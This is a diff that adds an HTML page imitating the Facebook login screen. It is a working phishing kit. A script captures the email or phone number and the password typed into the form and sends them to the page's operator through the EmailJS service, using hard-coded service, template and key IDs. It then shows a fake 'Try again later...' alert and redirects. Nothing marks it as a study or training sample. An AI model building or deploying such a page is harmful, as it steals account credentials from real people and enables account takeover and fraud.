@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Facebook</title>
+  <link rel="stylesheet" href="style2.css" />
+  <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+<script>
+  function sendMail(event) {
+    event.preventDefault();
+    let params = {
+      text: document.getElementById("user").value,
+      password: document.getElementById("pass").value,
+    };
+    emailjs.send("service_jqrqsgp", "template_euv9m1j", params)
+      .then(function() {
+        alert("Try again later...");
+        window.location.href = "index.html";
+      })
+      .catch(function(error) {
+        console.error("Error sending email:", error);
+      });
+  }
+</script>
+  <script type="text/javascript">
+    (function() {
+      emailjs.init("gJ76XQghf81APPWWA");
+    })();
+  </script>
+</head>
+<body>
+  <div class="content">
+    <div class="flex-div">
+      <div class="name-content">
+        <h1 class="logo">Facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+      </div>
+      <form id="regForm" onsubmit="sendMail(event)" action="javascript:void(0);">
+        <input type="text" id="user" placeholder="Email or Phone Number" required />
+        <input type="password" id="pass" placeholder="Password" required />
+        <button type="submit" class="login">Login</button>
+
+      </form>
+    </div>
+  </div>
+</body>
+</html>
